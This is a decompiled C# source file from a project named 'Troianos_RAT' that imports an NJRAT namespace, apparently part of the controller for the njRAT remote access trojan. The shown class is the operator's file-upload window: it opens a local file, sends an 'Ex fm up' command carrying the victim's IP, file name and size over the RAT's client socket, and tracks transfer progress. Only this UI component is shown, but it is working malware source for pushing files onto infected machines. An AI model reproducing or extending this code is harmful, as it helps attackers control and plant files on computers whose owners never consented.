using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.NJRAT;

namespace Troianos_RAT
{
	// Token: 0x02000020 RID: 32
	[DesignerGenerated]
	public partial class up : Form
	{
		// Token: 0x060003E8 RID: 1000 RVA: 0x001FD218 File Offset: 0x001FB618
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = up.__ENCList;
			lock (_ENCList)
			{
				bool flag = up.__ENCList.Count == up.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = up.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = up.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								up.__ENCList[num] = up.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					up.__ENCList.RemoveRange(num, up.__ENCList.Count - num);
					up.__ENCList.Capacity = up.__ENCList.Count;
				}
				up.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000147 RID: 327
		// (get) Token: 0x060003EB RID: 1003 RVA: 0x001FD7FC File Offset: 0x001FBBFC
		// (set) Token: 0x060003EC RID: 1004 RVA: 0x001FD814 File Offset: 0x001FBC14
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x17000148 RID: 328
		// (get) Token: 0x060003ED RID: 1005 RVA: 0x001FD820 File Offset: 0x001FBC20
		// (set) Token: 0x060003EE RID: 1006 RVA: 0x001FD838 File Offset: 0x001FBC38
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x17000149 RID: 329
		// (get) Token: 0x060003EF RID: 1007 RVA: 0x001FD898 File Offset: 0x001FBC98
		// (set) Token: 0x060003F0 RID: 1008 RVA: 0x001FD8B0 File Offset: 0x001FBCB0
		internal virtual GClass9 Lv1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Lv1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Lv1 = value;
			}
		}

		// Token: 0x1700014A RID: 330
		// (get) Token: 0x060003F1 RID: 1009 RVA: 0x001FD8BC File Offset: 0x001FBCBC
		// (set) Token: 0x060003F2 RID: 1010 RVA: 0x001FD8D4 File Offset: 0x001FBCD4
		internal virtual Timer vmethod_4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.vmethod_4_Tick);
				bool flag = this._vmethod_4 != null;
				if (flag)
				{
					this._vmethod_4.Tick -= value2;
				}
				this._vmethod_4 = value;
				flag = (this._vmethod_4 != null);
				if (flag)
				{
					this._vmethod_4.Tick += value2;
				}
			}
		}

		// Token: 0x1700014B RID: 331
		// (get) Token: 0x060003F3 RID: 1011 RVA: 0x001FD934 File Offset: 0x001FBD34
		// (set) Token: 0x060003F4 RID: 1012 RVA: 0x001FD94C File Offset: 0x001FBD4C
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x1700014C RID: 332
		// (get) Token: 0x060003F5 RID: 1013 RVA: 0x001FD958 File Offset: 0x001FBD58
		// (set) Token: 0x060003F6 RID: 1014 RVA: 0x001FD970 File Offset: 0x001FBD70
		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		// Token: 0x060003F7 RID: 1015 RVA: 0x001FD97C File Offset: 0x001FBD7C
		public up()
		{
			base.FormClosing += this.up_FormClosing;
			base.Load += this.up_Load;
			up.__ENCAddToList(this);
			this.Closinge = false;
			this.os = 0;
			this.InitializeComponent();
		}

		// Token: 0x060003F8 RID: 1016 RVA: 0x001FD9D8 File Offset: 0x001FBDD8
		private void Button1_Click(object sender, EventArgs e)
		{
			this.Close();
		}

		// Token: 0x060003F9 RID: 1017 RVA: 0x001FD9E4 File Offset: 0x001FBDE4
		private void up_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.Closinge = true;
			try
			{
				this.FS.Close();
				this.FS.Dispose();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.sk.Close();
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x060003FA RID: 1018 RVA: 0x001FDA60 File Offset: 0x001FBE60
		private void up_Load(object sender, EventArgs e)
		{
			this.FS = new FileStream(this.TMP, FileMode.Open);
			this.Lv1.Items[0].SubItems[0].Text = new FileInfo(this.TMP).Name;
			this.Lv1.Items[1].SubItems[0].Text = Class6.smethod_17((long)this.SZ);
			this.Lv1.Items[2].SubItems[0].Text = Class6.smethod_17(0L);
			this.Lv1.Items[3].SubItems[0].Text = Class6.smethod_17(0L);
			this.ProgressBar1.Maximum = this.SZ;
			this.osk.Send(string.Concat(new string[]
			{
				"Ex",
				Class7.string_1,
				"fm",
				Class7.string_1,
				"up",
				Class7.string_1,
				this.osk.ip(),
				Class7.string_1,
				Class6.smethod_14(ref this.FN),
				Class7.string_1,
				Conversions.ToString(this.SZ)
			}));
			this.Lv1.method_3();
			this.vmethod_4.Enabled = true;
		}

		// Token: 0x060003FB RID: 1019 RVA: 0x001FDBF0 File Offset: 0x001FBFF0
		private void vmethod_4_Tick(object sender, EventArgs e)
		{
			try
			{
				this.Lv1.Items[2].SubItems[1].Text = Class6.smethod_17((long)(this.ProgressBar1.Value - this.os));
				this.os = this.ProgressBar1.Value;
				this.Lv1.Items[3].SubItems[1].Text = Class6.smethod_17((long)this.ProgressBar1.Value);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x040001D9 RID: 473
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x040001DB RID: 475
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x040001DC RID: 476
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x040001DD RID: 477
		[AccessedThroughProperty("Lv1")]
		private GClass9 _Lv1;

		// Token: 0x040001DE RID: 478
		[AccessedThroughProperty("vmethod_4")]
		private Timer _vmethod_4;

		// Token: 0x040001DF RID: 479
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x040001E0 RID: 480
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		// Token: 0x040001E1 RID: 481
		public bool Closinge;

		// Token: 0x040001E2 RID: 482
		public string FN;

		// Token: 0x040001E3 RID: 483
		public FileStream FS;

		// Token: 0x040001E4 RID: 484
		public int os;

		// Token: 0x040001E5 RID: 485
		public Client osk;

		// Token: 0x040001E6 RID: 486
		public Client sk;

		// Token: 0x040001E7 RID: 487
		public int SZ;

		// Token: 0x040001E8 RID: 488
		public string TMP;
	}
}
